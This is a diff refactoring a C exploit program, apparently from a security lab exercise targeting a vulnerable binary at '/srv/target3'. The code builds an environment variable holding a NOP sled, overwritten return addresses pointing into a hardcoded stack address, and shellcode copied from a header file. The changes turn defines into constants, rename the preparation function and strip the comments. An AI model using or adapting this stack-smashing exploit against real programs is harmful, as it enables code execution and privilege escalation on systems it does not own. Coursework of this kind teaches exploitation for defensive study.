@@ -5,23 +5,15 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target3"
-#define ENV_SIZE 400
-#define BASE_ADDRESS 0xffffdec0
-#define NOP_SLED_SIZE 201
+const int ENV_SIZE = 400;
+const uint32_t BASE_ADDRESS = 0xffffdec0;
+const int NOP_SLED_SIZE = 201;
 
-void prepareEnvironment(char *env) {
-    // Fill environment with NOPs
+void prepare(char *env) {
     memset(env, 0x90, ENV_SIZE - 1);
-
-    // Adjust return addresses
-    *((uint32_t *)(env)) = BASE_ADDRESS + 4;
-    *((uint32_t *)(env + 4)) = BASE_ADDRESS + 8;
-
-    // Copy shellcode to the specified position
+    *(uint32_t *)(env) = BASE_ADDRESS + 4;
+    *(uint32_t *)(env + 4) = BASE_ADDRESS + 8;
     memcpy(env + NOP_SLED_SIZE, shellcode, sizeof(shellcode));
-
-    // Ensure the environment is null-terminated
     env[ENV_SIZE - 1] = '\0';
 }
 
@@ -33,7 +25,7 @@ int main(void) {
     };
     static char environment[ENV_SIZE];
 
-    prepareEnvironment(environment);
+    prepare(environment);
 
     char *env[] = {environment};
 
